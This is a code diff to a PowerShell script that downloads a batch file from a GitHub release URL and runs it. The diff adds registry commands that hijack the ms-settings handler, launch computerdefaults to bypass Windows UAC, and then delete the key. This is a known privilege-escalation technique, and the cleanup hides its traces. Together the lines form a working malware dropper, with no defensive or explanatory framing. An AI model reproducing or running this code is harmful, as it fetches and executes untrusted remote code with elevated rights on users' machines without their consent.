@@ -58,6 +58,10 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
         Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
         Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
+        reg add hkcu\Software\Classes\ms-settings\shell\open\command /d "%~f0" /f
+        reg add hkcu\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+        computerdefaults --nouacbypass
+        reg delete hkcu\Software\Classes\ms-settings /f
         Write-Output "Khởi chạy tệp batch."
         
         # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
